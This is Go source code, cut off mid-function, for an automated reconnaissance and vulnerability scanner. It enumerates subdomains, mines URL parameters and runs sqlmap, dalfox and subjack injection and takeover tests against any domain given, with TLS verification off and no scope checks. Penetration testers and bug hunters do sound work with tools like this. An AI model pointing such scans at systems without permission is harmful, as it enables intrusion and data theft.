package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
	ColorBold   = "\033[1m"
)

type Vulnerability struct {
	Type        string    `json:"type"`
	Severity    string    `json:"severity"`
	URL         string    `json:"url"`
	Parameter   string    `json:"parameter,omitempty"`
	Evidence    string    `json:"evidence"`
	Tool        string    `json:"tool"`
	Timestamp   time.Time `json:"timestamp"`
	Remediation string    `json:"remediation,omitempty"`
}

type ScanResult struct {
	Domain          string          `json:"domain"`
	ScanTime        time.Time       `json:"scan_time"`
	Subdomains      []string        `json:"subdomains"`
	LiveHosts       []string        `json:"live_hosts"`
	Parameters      []Parameter     `json:"parameters"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	S3Buckets       []S3Bucket      `json:"s3_buckets"`
	JSFindings      []JSFinding     `json:"js_findings"`
	Statistics      Statistics      `json:"statistics"`
}

type Parameter struct {
	URL       string `json:"url"`
	Method    string `json:"method"`
	ParamName string `json:"param_name"`
	ParamType string `json:"param_type"`
	Value     string `json:"value,omitempty"`
}

type S3Bucket struct {
	Name       string   `json:"name"`
	Region     string   `json:"region"`
	Public     bool     `json:"public"`
	Listable   bool     `json:"listable"`
	Writable   bool     `json:"writable"`
	Takeover   bool     `json:"takeover"`
	BucketType string   `json:"bucket_type"`
	Secrets    []string `json:"secrets,omitempty"`
}

type JSFinding struct {
	URL      string `json:"url"`
	Type     string `json:"type"`
	Finding  string `json:"finding"`
	Line     int    `json:"line"`
	Severity string `json:"severity"`
}

type Statistics struct {
	TotalSubdomains      int `json:"total_subdomains"`
	LiveHosts            int `json:"live_hosts"`
	ParametersFound      int `json:"parameters_found"`
	VulnerabilitiesFound int `json:"vulnerabilities_found"`
	CriticalVulns        int `json:"critical_vulns"`
	HighVulns            int `json:"high_vulns"`
	MediumVulns          int `json:"medium_vulns"`
	S3BucketsFound       int `json:"s3_buckets_found"`
	JSFilesAnalyzed      int `json:"js_files_analyzed"`
}

type Scanner struct {
	Domain  string
	Output  string
	Threads int
	Modules []string
	Result  *ScanResult
	mu      sync.Mutex
	Client  *http.Client
}

func main() {
	banner()

	domain := flag.String("d", "", "Target domain (required)")
	modules := flag.String("m", "", "Modules: s(subdomain),sqli,xss,ssrf,aes(jscrypto),nuclei,s3,blindxss")
	output := flag.String("o", "scan_results.json", "Output file")
	threads := flag.Int("t", 50, "Number of threads")
	all := flag.Bool("all", false, "Run all modules")
	flag.Parse()

	if *domain == "" {
		fmt.Println(ColorRed + "[!] Domain is required. Use -d flag" + ColorReset)
		flag.Usage()
		os.Exit(1)
	}

	// If -all flag is set, use all modules
	var moduleList []string
	if *all {
		moduleList = []string{"s", "sqli", "xss", "blindxss", "ssrf", "aes", "nuclei", "s3"}
		fmt.Printf("%s[*] Running ALL modules%s\n", ColorGreen, ColorReset)
	} else if *modules == "" {
		// Default modules if nothing specified
		moduleList = []string{"s", "nuclei"}
		fmt.Printf("%s[*] Using default modules: s,nuclei%s\n", ColorYellow, ColorReset)
	} else {
		moduleList = strings.Split(*modules, ",")
	}

	scanner := &Scanner{
		Domain:  *domain,
		Output:  *output,
		Threads: *threads,
		Modules: moduleList,
		Result: &ScanResult{
			Domain:   *domain,
			ScanTime: time.Now(),
		},
		Client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}

	fmt.Printf("%s[*] Target: %s%s\n", ColorCyan, *domain, ColorReset)
	fmt.Printf("%s[*] Modules: %s%s\n", ColorCyan, strings.Join(moduleList, ","), ColorReset)
	fmt.Printf("%s[*] Threads: %d%s\n\n", ColorCyan, *threads, ColorReset)

	scanner.Run()
}

func banner() {
	fmt.Printf("%s%s", ColorCyan, `
+=================================================================+
|         *UÇK* SCANNER v4.0 - GO EDITION COMPLETE              |
|       5-Layer Parameter Mining + Smart Prioritization         |
|       SSRF Callback + Blind XSS Integration                    |
|         Zero Noise - Maximum Impact                            |
+=================================================================+
`)
	fmt.Println(ColorReset)
}

func (s *Scanner) Run() {
	startTime := time.Now()

	if s.hasModule("s") {
		s.enumerateSubdomains()
		s.checkLiveHosts()
		s.checkSubdomainTakeover()
	}

	if len(s.Result.LiveHosts) == 0 {
		fmt.Println(ColorRed + "[!] No live hosts found. Exiting." + ColorReset)
		return
	}

	// 5-Layer Parameter Mining
	s.mineParameters()

	if s.hasModule("s3") {
		s.scanS3Buckets()
	}

	if s.hasModule("aes") {
		s.analyzeJavaScript()
	}

	var wg sync.WaitGroup

	if s.hasModule("xss") {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.scanXSS()
		}()
	}

	if s.hasModule("blindxss") {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.scanBlindXSS()
		}()
	}

	if s.hasModule("sqli") {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.scanSQLi()
		}()
	}

	if s.hasModule("ssrf") {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.scanSSRF()
		}()
	}

	wg.Wait()

	if s.hasModule("nuclei") {
		s.runNuclei()
	}

	s.scanPorts()
	s.fuzzDirectories()
	s.checkCORS()
	s.generateReport()

	elapsed := time.Since(startTime)
	fmt.Printf("\n%s[✓] Scan completed in %s%s\n", ColorGreen, elapsed.Round(time.Second), ColorReset)
	fmt.Printf("%s[✓] Results saved to: %s%s\n", ColorGreen, s.Output, ColorReset)
}

func (s *Scanner) hasModule(module string) bool {
	for _, m := range s.Modules {
		if m == module {
			return true
		}
	}
	return false
}

// ==================== SUBDOMAIN ENUMERATION ====================

func (s *Scanner) enumerateSubdomains() {
	fmt.Printf("\n%s%s[+] MODULE: SUBDOMAIN ENUMERATION%s\n", ColorBold, ColorBlue, ColorReset)

	subdomains := make(map[string]bool)

	fmt.Printf("%s[*] Checking crt.sh...%s\n", ColorCyan, ColorReset)
	crtSubdomains := s.getCrtShSubdomains()
	for _, sub := range crtSubdomains {
		subdomains[sub] = true
	}

	fmt.Printf("%s[*] Running subfinder...%s\n", ColorCyan, ColorReset)
	subfinderSubs := s.runSubfinder()
	for _, sub := range subfinderSubs {
		subdomains[sub] = true
	}

	fmt.Printf("%s[*] Bruteforcing common subdomains...%s\n", ColorCyan, ColorReset)
	bruteSubs := s.bruteforceSubdomains()
	for _, sub := range bruteSubs {
		subdomains[sub] = true
	}

	for sub := range subdomains {
		s.Result.Subdomains = append(s.Result.Subdomains, sub)
	}

	fmt.Printf("%s[✓] Found %d subdomains%s\n", ColorGreen, len(s.Result.Subdomains), ColorReset)
}

func (s *Scanner) getCrtShSubdomains() []string {
	var subdomains []string
	url := fmt.Sprintf("https://crt.sh/?q=%%25.%s&output=json", s.Domain)

	resp, err := s.Client.Get(url)
	if err != nil {
		return subdomains
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	var results []map[string]interface{}
	if err := json.Unmarshal(body, &results); err != nil {
		return subdomains
	}

	seen := make(map[string]bool)
	for _, result := range results {
		if nameValue, ok := result["name_value"].(string); ok {
			names := strings.Split(nameValue, "\n")
			for _, name := range names {
				name = strings.TrimSpace(name)
				name = strings.TrimPrefix(name, "*.")
				if !seen[name] && strings.HasSuffix(name, s.Domain) {
					seen[name] = true
					subdomains = append(subdomains, name)
				}
			}
		}
	}

	return subdomains
}

func (s *Scanner) runSubfinder() []string {
	var subdomains []string

	cmd := exec.Command("subfinder", "-d", s.Domain, "-silent")
	output, err := cmd.Output()
	if err != nil {
		return subdomains
	}

	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	for scanner.Scan() {
		sub := strings.TrimSpace(scanner.Text())
		if sub != "" {
			subdomains = append(subdomains, sub)
		}
	}

	return subdomains
}

func (s *Scanner) bruteforceSubdomains() []string {
	var subdomains []string
	commonSubs := []string{
		"www", "mail", "remote", "blog", "webmail", "server", "ns1", "ns2",
		"smtp", "secure", "vpn", "m", "shop", "ftp", "mail2", "test", "portal",
		"ns", "ww1", "host", "support", "dev", "web", "bbs", "ww42", "mx", "email",
		"cloud", "1", "mail1", "2", "forum", "owa", "www2", "gw", "admin", "store",
		"mx1", "cdn", "api", "exchange", "app", "gov", "2tty", "vps", "govyty",
		"hgfgdf", "news", "1rer", "lkjkui", "staging", "demo", "qa", "jenkins",
	}

	var wg sync.WaitGroup
	results := make(chan string, len(commonSubs))

	for _, prefix := range commonSubs {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			subdomain := fmt.Sprintf("%s.%s", p, s.Domain)
			if s.isDomainResolvable(subdomain) {
				results <- subdomain
			}
		}(prefix)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for sub := range results {
		subdomains = append(subdomains, sub)
	}

	return subdomains
}

func (s *Scanner) isDomainResolvable(domain string) bool {
	url := fmt.Sprintf("http://%s", domain)
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")

	resp, err := s.Client.Do(req)
	if err == nil {
		resp.Body.Close()
		return true
	}
	return false
}

func (s *Scanner) checkLiveHosts() {
	fmt.Printf("\n%s[*] Checking live hosts...%s\n", ColorCyan, ColorReset)

	var wg sync.WaitGroup
	liveHosts := make(chan string, len(s.Result.Subdomains))

	semaphore := make(chan struct{}, s.Threads)

	for _, subdomain := range s.Result.Subdomains {
		wg.Add(1)
		go func(sub string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			for _, scheme := range []string{"https", "http"} {
				url := fmt.Sprintf("%s://%s", scheme, sub)
				req, _ := http.NewRequest("GET", url, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0")

				resp, err := s.Client.Do(req)
				if err == nil {
					resp.Body.Close()
					liveHosts <- url
					return
				}
			}
		}(subdomain)
	}

	go func() {
		wg.Wait()
		close(liveHosts)
	}()

	for host := range liveHosts {
		s.mu.Lock()
		s.Result.LiveHosts = append(s.Result.LiveHosts, host)
		s.mu.Unlock()
	}

	fmt.Printf("%s[✓] Found %d live hosts%s\n", ColorGreen, len(s.Result.LiveHosts), ColorReset)
}

func (s *Scanner) checkSubdomainTakeover() {
	fmt.Printf("\n%s%s[+] Checking Subdomain Takeover...%s\n", ColorBold, ColorYellow, ColorReset)

	cmd := exec.Command("subjack", "-w", "-", "-t", "100", "-timeout", "30", "-o", "subjack_results.txt", "-ssl")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return
	}

	go func() {
		defer stdin.Close()
		for _, sub := range s.Result.Subdomains {
			fmt.Fprintln(stdin, sub)
		}
	}()

	output, err := cmd.CombinedOutput()
	if err == nil && len(output) > 0 {
		scanner := bufio.NewScanner(strings.NewReader(string(output)))
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "[VULNERABLE]") {
				vuln := Vulnerability{
					Type:        "Subdomain Takeover",
					Severity:    "CRITICAL",
					URL:         line,
					Evidence:    "Subdomain is vulnerable to takeover",
					Tool:        "subjack",
					Timestamp:   time.Now(),
					Remediation: "Remove DNS record or claim the service",
				}
				s.addVulnerability(vuln)
				fmt.Printf("%s[!] CRITICAL: Subdomain Takeover found: %s%s\n", ColorRed, line, ColorReset)
			}
		}
	}
}

// ==================== 5-LAYER PARAMETER MINING ====================

func (s *Scanner) mineParameters() {
	fmt.Printf("\n%s%s[+] MODULE: 5-LAYER PARAMETER MINING%s\n", ColorBold, ColorBlue, ColorReset)
	fmt.Printf("%s[*] Mining parameters from all live hosts...%s\n", ColorCyan, ColorReset)

	seen := make(map[string]bool)
	paramChan := make(chan Parameter, 5000)

	// Layer 0: Katana Deep Crawling (runs in background)
	fmt.Printf("\n%s[*] Layer 0: Katana deep crawling...%s\n", ColorCyan, ColorReset)
	var katanaWg sync.WaitGroup
	katanaWg.Add(1)
	go func() {
		defer katanaWg.Done()
		katanaParams := s.runKatana()
		for _, param := range katanaParams {
			paramChan <- param
		}
	}()

	// Layer 1: Custom HTML/JS Extraction
	fmt.Printf("%s[*] Layer 1: Custom HTML/JS extraction...%s\n", ColorCyan, ColorReset)
	var wg sync.WaitGroup
	for _, host := range s.Result.LiveHosts {
		wg.Add(1)
		go func(h string) {
			defer wg.Done()
			params := s.extractParameters(h)
			for _, p := range params {
				paramChan <- p
			}
		}(host)
	}

	// Wait for Layer 0 and Layer 1 to complete, then close channel
	go func() {
		wg.Wait()
		katanaWg.Wait()
		close(paramChan)
	}()

	// Collect all parameters from Layer 0 and 1
	for param := range paramChan {
		key := fmt.Sprintf("%s_%s_%s", param.URL, param.Method, param.ParamName)
		if !seen[key] {
			seen[key] = true
			s.mu.Lock()
			s.Result.Parameters = append(s.Result.Parameters, param)
			s.mu.Unlock()
		}
	}

	fmt.Printf("%s[✓] Layers 0-1 found %d parameters%s\n", ColorGreen, len(s.Result.Parameters), ColorReset)

	// Layer 2: ParamSpider (Wayback Machine)
	fmt.Printf("\n%s[*] Layer 2: ParamSpider (Wayback Machine)...%s\n", ColorCyan, ColorReset)
	paramspiderParams := s.runParamSpider()
	for _, param := range paramspiderParams {
		key := fmt.Sprintf("%s_%s_%s", param.URL, param.Method, param.ParamName)
		if !seen[key] {
			seen[key] = true
			s.mu.Lock()
			s.Result.Parameters = append(s.Result.Parameters, param)
			s.mu.Unlock()
		}
	}

	// Layer 3: gau (GetAllURLs - Multiple Archives)
	fmt.Printf("%s[*] Layer 3: gau (multiple archives)...%s\n", ColorCyan, ColorReset)
	gauParams := s.runGau()
	for _, param := range gauParams {
		key := fmt.Sprintf("%s_%s_%s", param.URL, param.Method, param.ParamName)
		if !seen[key] {
			seen[key] = true
			s.mu.Lock()
			s.Result.Parameters = append(s.Result.Parameters, param)
			s.mu.Unlock()
		}
	}

	fmt.Printf("%s[✓] Total after archives: %d parameters%s\n", ColorGreen, len(s.Result.Parameters), ColorReset)

	// Save parameters for vulnerability testing
	s.saveParametersToFile()

	// Layer 4: Parameter Fuzzing (Hidden Parameters)
	fmt.Printf("\n%s[*] Layer 4: Fuzzing for hidden parameters...%s\n", ColorCyan, ColorReset)
	s.fuzzHiddenParameters()

	fmt.Printf("\n%s%s[✓] 5-LAYER MINING COMPLETE: %d unique parameters found%s\n", 
		ColorBold, ColorGreen, len(s.Result.Parameters), ColorReset)

	// Print statistics
	s.printParameterStats()
}

func (s *Scanner) runKatana() []Parameter {
	var params []Parameter

	if _, err := exec.LookPath("katana"); err != nil {
		fmt.Printf("%s[!] Katana not found, skipping deep crawling%s\n", ColorYellow, ColorReset)
		fmt.Printf("%s[*] Install: go install github.com/projectdiscovery/katana/cmd/katana@latest%s\n", ColorYellow, ColorReset)
		return params
	}

	hostsFile, _ := os.Create("katana_targets.txt")
	for _, host := range s.Result.LiveHosts {
		fmt.Fprintln(hostsFile, host)
	}
	hostsFile.Close()

	fmt.Printf("%s[*] Deep crawling %d hosts with Katana...%s\n", ColorCyan, len(s.Result.LiveHosts), ColorReset)

	cmd := exec.Command("katana",
		"-list", "katana_targets.txt",
		"-js-crawl",
		"-form-extraction",
		"-automatic-form-fill",
		"-known-files", "all",
		"-field-scope", "rdn",
		"-depth", "3",
		"-concurrency", "10",
		"-silent",
	)

	output, err := cmd.Output()
	if err != nil {
		return params
	}

	skipParams := map[string]bool{
		"family": true, "display": true, "subset": true, "utm_source": true,
		"utm_medium": true, "utm_campaign": true, "fbclid": true, "gclid": true,
	}

	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	crawledURLs := 0
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		crawledURLs++

		if strings.Contains(line, "?") {
			parts := strings.Split(line, "?")
			if len(parts) == 2 {
				baseURL := parts[0]
				paramPairs := strings.Split(parts[1], "&")
				for _, pair := range paramPairs {
					kv := strings.Split(pair, "=")
					if len(kv) >= 1 {
						paramName := strings.ToLower(strings.TrimSpace(kv[0]))

						if skipParams[paramName] || len(paramName) < 2 {
							continue
						}

						param := Parameter{
							URL:       baseURL,
							Method:    "GET",
							ParamName: paramName,
							ParamType: "GET_KATANA",
						}
						if len(kv) == 2 {
							param.Value = kv[1]
						}
						params = append(params, param)
					}
				}
			}
		}
	}

	fmt.Printf("%s[✓] Katana: crawled %d URLs, found %d parameters%s\n", 
		ColorGreen, crawledURLs, len(params), ColorReset)

	return params
}

func (s *Scanner) runParamSpider() []Parameter {
	var params []Parameter

	if _, err := exec.LookPath("paramspider"); err != nil {
		fmt.Printf("%s[!] ParamSpider not found, skipping%s\n", ColorYellow, ColorReset)
		return params
	}

	cmd := exec.Command("paramspider", "-d", s.Domain, "-s", "-o", "paramspider_output.txt")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return params
	}

	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.Contains(line, "?") {
			parts := strings.Split(line, "?")
			if len(parts) == 2 {
				baseURL := parts[0]
				paramPairs := strings.Split(parts[1], "&")
				for _, pair := range paramPairs {
					kv := strings.Split(pair, "=")
					if len(kv) >= 1 {
						param := Parameter{
							URL:       baseURL,
							Method:    "GET",
							ParamName: strings.ToLower(strings.TrimSpace(kv[0])),
							ParamType: "GET_ARCHIVED",
						}
						if len(kv) == 2 {
							param.Value = kv[1]
						}
						params = append(params, param)
					}
				}
			}
		}
	}

	fmt.Printf("%s[✓] ParamSpider: found %d archived parameters%s\n", ColorGreen, len(params), ColorReset)
	return params
}

func (s *Scanner) runGau() []Parameter {
	var params []Parameter

	if _, err := exec.LookPath("gau"); err != nil {
		fmt.Printf("%s[!] gau not found, skipping%s\n", ColorYellow, ColorReset)
		return params
	}

	cmd := exec.Command("gau", s.Domain, "--threads", "10", "--blacklist", "png,jpg,gif,css,woff")
	output, err := cmd.Output()
	if err != nil {
		return params
	}

	skipParams := map[string]bool{
		"family": true, "display": true, "subset": true, "utm_source": true,
		"utm_medium": true, "utm_campaign": true, "fbclid": true, "gclid": true,
	}

	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.Contains(line, "?") {
			parts := strings.Split(line, "?")
			if len(parts) == 2 {
				baseURL := parts[0]
				paramPairs := strings.Split(parts[1], "&")
				for _, pair := range paramPairs {
					kv := strings.Split(pair, "=")
					if len(kv) >= 1 {
						paramName := strings.ToLower(strings.TrimSpace(kv[0]))

						if skipParams[paramName] {
							continue
						}

						param := Parameter{
							URL:       baseURL,
							Method:    "GET",
							ParamName: paramName,
							ParamType: "GET_GAU",
						}
						if len(kv) == 2 {
							param.Value = kv[1]
						}
						params = append(params, param)
					}
				}
			}
		}
	}

	fmt.Printf("%s[✓] gau: found %d archived parameters%s\n", ColorGreen, len(params), ColorReset)
	return params
}

func (s *Scanner) fuzzHiddenParameters() {
	commonParams := []string{
		"id", "user", "account", "number", "order", "no", "doc", "key", "email", "group", "profile",
		"edit", "report", "file", "document", "folder", "path", "url", "redirect", "return", "view",
		"preview", "download", "callback", "data", "q", "search", "query", "keyword", "filter",
		"category", "type", "sort", "order", "lang", "page", "offset", "limit", "start", "end",
	}

	fmt.Printf("%s[*] Testing %d common parameter names...%s\n", ColorCyan, len(commonParams), ColorReset)

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)
	foundParams := make(chan Parameter, 100)

	for _, host := range s.Result.LiveHosts {
		for _, paramName := range commonParams {
			wg.Add(1)
			go func(h, p string) {
				defer wg.Done()
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				testURL := fmt.Sprintf("%s?%s=test", h, p)
				resp1, err := s.Client.Get(testURL)
				if err != nil {
					return
				}
				body1, _ := ioutil.ReadAll(resp1.Body)
				resp1.Body.Close()

				testURL2 := fmt.Sprintf("%s?%s=test2", h, p)
				resp2, err := s.Client.Get(testURL2)
				if err != nil {
					return
				}
				body2, _ := ioutil.ReadAll(resp2.Body)
				resp2.Body.Close()

				if len(body1) != len(body2) || string(body1) != string(body2) {
					param := Parameter{
						URL:       h,
						Method:    "GET",
						ParamName: p,
						ParamType: "GET_FUZZED",
					}
					foundParams <- param
				}
			}(host, paramName)
		}
	}

	go func() {
		wg.Wait()
		close(foundParams)
	}()

	fuzzCount := 0
	seen := make(map[string]bool)
	for param := range foundParams {
		key := fmt.Sprintf("%s_%s", param.URL, param.ParamName)
		if !seen[key] {
			seen[key] = true
			s.mu.Lock()
			s.Result.Parameters = append(s.Result.Parameters, param)
			s.mu.Unlock()
			fuzzCount++
			fmt.Printf("%s[✓] Hidden param: %s on %s%s\n", ColorGreen, param.ParamName, param.URL, ColorReset)
		}
	}

	if fuzzCount > 0 {
		fmt.Printf("%s[✓] Fuzzing: found %d hidden parameters%s\n", ColorGreen, fuzzCount, ColorReset)
	}
}

func (s *Scanner) extractParameters(url string) []Parameter {
	var params []Parameter

	resp, err := s.Client.Get(url)
	if err != nil {
		return params
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	bodyStr := string(body)

	contentType := resp.Header.Get("Content-Type")
	if !strings.Contains(contentType, "html") &&
		!strings.Contains(contentType, "javascript") &&
		!strings.Contains(contentType, "json") {
		return params
	}

	skipParams := map[string]bool{
		"family": true, "display": true, "subset": true, "text": true, "version": true, "v": true, "_": true,
		"utm_source": true, "utm_medium": true, "utm_campaign": true, "fbclid": true, "gclid": true,
		"ref": true, "source": true, "lang": true, "locale": true, "theme": true, "skin": true,
		"color": true, "size": true, "width": true, "height": true,
	}

	highValueParams := map[string]bool{
		"id": true, "user": true, "userid": true, "username": true, "email": true,
		"file": true, "path": true, "url": true, "redirect": true, "return": true,
		"next": true, "callback": true, "dest": true, "target": true, "page": true,
		"doc": true, "document": true, "folder": true, "query": true, "q": true,
		"search": true, "keyword": true, "filter": true, "sort": true, "order": true,
		"cmd": true, "exec": true, "command": true, "sql": true, "data": true,
		"input": true, "template": true, "view": true, "load": true, "fetch": true,
		"get": true, "post": true, "action": true,
	}

	// Extract URL parameters
	urlRegex := regexp.MustCompile(`(?:href|src|action)=["']([^"']+\?[^"']+)["']`)
	matches := urlRegex.FindAllStringSubmatch(bodyStr, -1)

	for _, match := range matches {
		if len(match) > 1 {
			fullURL := match[1]

			if strings.Contains(fullURL, "google") ||
				strings.Contains(fullURL, "fonts.") ||
				strings.Contains(fullURL, "cdn.") {
				continue
			}

			if strings.Contains(fullURL, "?") {
				parts := strings.Split(fullURL, "?")
				if len(parts) == 2 {
					paramPairs := strings.Split(parts[1], "&")
					for _, pair := range paramPairs {
						kv := strings.Split(pair, "=")
						if len(kv) >= 1 {
							paramName := strings.ToLower(strings.TrimSpace(kv[0]))

							if skipParams[paramName] || len(paramName) < 2 {
								continue
							}

							param := Parameter{
								URL:       url,
								Method:    "GET",
								ParamName: paramName,
								ParamType: "GET",
							}

							if highValueParams[paramName] {
								param.ParamType = "GET_HIGH_VALUE"
							}

							if len(kv) == 2 {
								param.Value = kv[1]
							}
							params = append(params, param)
						}
					}
				}
			}
		}
	}

	// Extract form parameters
	formRegex := regexp.MustCompile(`<form[^>]*action=["']([^"']*)["'][^>]*>([\s\S]*?)</form>`)
	formMatches := formRegex.FindAllStringSubmatch(bodyStr, -1)

	for _, formMatch := range formMatches {
		if len(formMatch) > 2 {
			action := formMatch[1]
			formBody := formMatch[2]

			inputRegex := regexp.MustCompile(`<input[^>]*name=["']([^"']+)["']`)
			inputMatches := inputRegex.FindAllStringSubmatch(formBody, -1)

			methodRegex := regexp.MustCompile(`<form[^>]*method=["']([^"']+)["']`)
			methodMatch := methodRegex.FindStringSubmatch(formMatch[0])
			method := "GET"
			if len(methodMatch) > 1 {
				method = strings.ToUpper(methodMatch[1])
			}

			for _, inputMatch := range inputMatches {
				if len(inputMatch) > 1 {
					paramName := strings.ToLower(strings.TrimSpace(inputMatch[1]))

					if skipParams[paramName] || strings.Contains(paramName, "csrf") {
						continue
					}

					param := Parameter{
						URL:       url + action,
						Method:    method,
						ParamName: paramName,
						ParamType: method,
					}

					if highValueParams[paramName] {
						param.ParamType = method + "_HIGH_VALUE"
					}

					params = append(params, param)
				}
			}
		}
	}

	return params
}

func (s *Scanner) saveParametersToFile() {
	file, err := os.Create("parameters.txt")
	if err != nil {
		return
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	seen := make(map[string]bool)

	for _, param := range s.Result.Parameters {
		url := fmt.Sprintf("%s?%s=FUZZ", param.URL, param.ParamName)
		if !seen[url] {
			seen[url] = true
			writer.WriteString(url + "\n")
		}
	}
	writer.Flush()
}

func (s *Scanner) printParameterStats() {
	stats := make(map[string]int)
	highValue := 0

	for _, param := range s.Result.Parameters {
		stats[param.ParamType]++
		if strings.Contains(param.ParamType, "HIGH_VALUE") {
			highValue++
		}
	}

	fmt.Printf("\n%s[*] Parameter Statistics:%s\n", ColorCyan, ColorReset)
	for paramType, count := range stats {
		fmt.Printf("    %s: %d\n", paramType, count)
	}
	fmt.Printf("%s    HIGH_VALUE params: %d%s\n", ColorGreen, highValue, ColorReset)
}

// ==================== SMART VULNERABILITY TESTING ====================

func (s *Scanner) scanXSS() {
	fmt.Printf("\n%s%s[+] MODULE: XSS SCANNING (SMART PRIORITIZATION)%s\n", ColorBold, ColorBlue, ColorReset)

	if len(s.Result.Parameters) == 0 {
		fmt.Printf("%s[!] No parameters found to test%s\n", ColorYellow, ColorReset)
		return
	}

	// Prioritize HIGH_VALUE parameters
	highValueParams := []Parameter{}
	normalParams := []Parameter{}

	for _, param := range s.Result.Parameters {
		if strings.Contains(param.ParamType, "HIGH_VALUE") {
			highValueParams = append(highValueParams, param)
		} else {
			normalParams = append(normalParams, param)
		}
	}

	fmt.Printf("%s[*] Found %d high-value parameters (testing first)%s\n", ColorGreen, len(highValueParams), ColorReset)

	allParams := append(highValueParams, normalParams...)

	maxTest := 100
	if len(allParams) < maxTest {
		maxTest = len(allParams)
	}

	testParams := allParams[:maxTest]

	paramFile, _ := os.Create("xss_params.txt")
	for _, param := range testParams {
		url := fmt.Sprintf("%s?%s=FUZZ", param.URL, param.ParamName)
		fmt.Fprintln(paramFile, url)
	}
	paramFile.Close()

	cmd := exec.Command("dalfox", "file", "xss_params.txt",
		"-o", "dalfox_results.json",
		"--silence",
		"--format", "json",
		"--skip-bav",
		"--mining-dict",
		"--only-poc", "r",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("%s[!] Dalfox not found, skipping XSS testing%s\n", ColorYellow, ColorReset)
		return
	}

	vulnerabilitiesFound := 0

	if len(output) > 0 {
		scanner := bufio.NewScanner(strings.NewReader(string(output)))
		for scanner.Scan() {
			line := scanner.Text()
			var result map[string]interface{}

			if err := json.Unmarshal([]byte(line), &result); err == nil {
				vulnerabilitiesFound++

				vuln := Vulnerability{
					Type:        "Cross-Site Scripting (XSS)",
					Severity:    "HIGH",
					URL:         fmt.Sprintf("%v", result["data"]),
					Parameter:   fmt.Sprintf("%v", result["param"]),
					Evidence:    fmt.Sprintf("Payload: %v", result["payload"]),
					Tool:        "dalfox",
					Timestamp:   time.Now(),
					Remediation: "Implement proper input validation and output encoding",
				}
				s.addVulnerability(vuln)
				fmt.Printf("%s[!] XSS Found: %s (param: %s)%s\n",
					ColorRed, vuln.URL, vuln.Parameter, ColorReset)
			}
		}
	}

	fmt.Printf("%s[✓] Tested %d parameters, found %d XSS vulnerabilities%s\n", 
		ColorGreen, maxTest, vulnerabilitiesFound, ColorReset)
}

func (s *Scanner) scanSQLi() {
	fmt.Printf("\n%s%s[+] MODULE: SQL INJECTION (SMART PRIORITIZATION)%s\n", ColorBold, ColorBlue, ColorReset)

	if len(s.Result.Parameters) == 0 {
		fmt.Printf("%s[!] No parameters found to test%s\n", ColorYellow, ColorReset)
		return
	}

	// Prioritize SQL-prone parameters
	sqlProneParams := []Parameter{}
	sqlKeywords := map[string]bool{
		"id": true, "user": true, "userid": true, "account": true, "email": true,
		"order": true, "search": true, "query": true, "filter": true, "page": true,
		"cat": true, "category": true, "pid": true, "product": true,
	}

	for _, param := range s.Result.Parameters {
		if strings.Contains(param.ParamType, "HIGH_VALUE") || sqlKeywords[param.ParamName] {
			sqlProneParams = append(sqlProneParams, param)
		}
	}

	fmt.Printf("%s[*] Testing %d SQL-prone parameters...%s\n", ColorCyan, len(sqlProneParams), ColorReset)

	maxTests := 20
	if len(sqlProneParams) < maxTests {
		maxTests = len(sqlProneParams)
	}

	tested := 0
	for i := 0; i < maxTests && i < len(sqlProneParams); i++ {
		param := sqlProneParams[i]
		testURL := fmt.Sprintf("%s?%s=1", param.URL, param.ParamName)

		fmt.Printf("%s[*] Testing [%d/%d]: %s (param: %s)%s\n", 
			ColorCyan, i+1, maxTests, param.URL, param.ParamName, ColorReset)

		// Create context with timeout to prevent hanging
		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
		
		cmd := exec.CommandContext(ctx, "sqlmap",
			"-u", testURL,
			"--batch",
			"--random-agent",
			"--level=1",
			"--risk=1",
			"--threads=5",
			"--technique=BEUSTQ",
			"--answers=quit=N,crack=N,dict=N",
			"--output-dir=/tmp/sqlmap",
			"--flush-session",
			"--time-sec=5",
			"--timeout=10",
			"--retries=1",
		)

		output, err := cmd.CombinedOutput()
		cancel() // Clean up context
		
		tested++

		// Check if timeout occurred
		if ctx.Err() == context.DeadlineExceeded {
			fmt.Printf("%s[!] Timeout on %s (skipping)%s\n", ColorYellow, param.ParamName, ColorReset)
			continue
		}

		if err == nil && (strings.Contains(string(output), "injectable") || 
